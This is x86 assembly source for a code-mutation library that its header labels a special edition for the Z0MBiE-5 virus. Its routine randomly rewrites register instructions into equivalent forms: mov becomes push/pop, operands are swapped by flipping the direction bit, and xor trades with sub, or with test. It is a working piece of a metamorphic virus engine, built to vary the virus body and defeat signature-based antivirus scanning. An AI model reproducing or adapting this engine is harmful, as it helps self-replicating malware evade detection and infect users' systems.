
; ---------------------------------------------------------------------------
; PERVERT.LITE library
; ver.2.00 -- special edition for Z0MBiE-5 virus
; (x) 2000 Z0MBiE
; ---------------------------------------------------------------------------

; subroutine:   rnd3
; output:       ZF

rnd3:                   pusha
                        rnd     3
                        or      eax, eax
                        popa
                        ret

; subroutine:   pervert_opcode

; input/output: ECX=opcode, 4 bytes
; output:       EAX=1,NZ -- ECX has been modified
;               EAX=0,ZR -- ECX not changed

pervert_opcode:

; ---------------------------------------------------------------------------

                        mov     al, ch  ; modrm should be of type regreg
                        and     al, 0C0h
                        cmp     al, 0C0h
                        jne     __quit

; ---------------------------------------------------------------------------

; было:
; 100010s1 11xxxyyy     mov     r1, r2

; стало:
; 01010xxx              push    r2
; 01011yyy              pop     r1

                        mov     al, cl          ; mov
                        and     al, 0FDh
                        cmp     al, 089h
                        jne     __x1_skip

                        call    rnd3
                        jz      __x1_skip

                        mov     al, ch
                        mov     ah, ch
                        and     ax, 3807h
                        shr     ah, 3

                        test    cl, 2
                        jnz     __x1_1

                        xchg    al, ah
__x1_1:
                        or      ax, 5850h       ; push/pop
                        mov     cx, ax

                        jmp     __done

__x1_skip:

; ---------------------------------------------------------------------------

; изменение: инвертировать s, обменять xxx и yyy

; 00ttt0sw 11xxxyyy     ttt     r1,r2 (ADD,ADC,AND,OR,SUB,SBB,XOR,CMP)
; 100010sw 11xxxyyy     mov     r1,r2

                        mov     al, cl
                        and     al, 11000100b   ; ttt
                        jz      __x2_1

                        mov     al, cl          ; mov
                        and     al, 0FCh
                        cmp     al, 088h
                        jne     __x2_skip
__x2_1:

                        call    rnd3
                        jz      __x2_skip

                        xor     cl, 2
                        mov     al, ch
                        mov     ah, ch
                        and     ax, 3807h
                        shl     al, 3
                        shr     ah, 3
                        or      al, ah
                        or      al, 0C0h
                        mov     ch, al

                        jmp     __done

__x2_skip:

; ---------------------------------------------------------------------------

; if (xxx==yyy)
; xor <--> sub, or <--> test

; 001100xx 11xxxyyy     xor     r, r
; 001010xx 11xxxyyy     sub     r, r
; 000010sx 11xxxyyy     or      r, r
; 1000010x 11xxxyyy     test    r, r

                        mov     al, ch
                        mov     ah, ch
                        and     ax, 3807h
                        shr     ah, 3
                        cmp     al, ah
                        jne     __x3_skip

                        call    rnd3
                        jz      __x3_skip

                        mov     al, cl
                        and     al, 0FEh
                        cmp     al, 84h         ; test
                        je      __x3_2
                        and     al, 0FCh
                        cmp     al, 08h         ; or
                        je      __x3_3
                        cmp     al, 28h         ; sub
                        je      __x3_1
                        cmp     al, 30h         ; xor
                        je      __x3_1

                        jmp     __x3_skip

__x3_1:                 xor     cl, 30h xor 28h ; xor <--> sub
                        jmp     __done

__x3_3:                 and     cl, 0FDh        ; clear s-bit if OR
__x3_2:                 xor     cl, 08h xor 84h ; or  <--> test
                        jmp     __done

__x3_skip:

; ---------------------------------------------------------------------------

__quit:                 xor     eax, eax
                        ret

__done:                 xor     eax, eax
                        inc     eax
                        ret
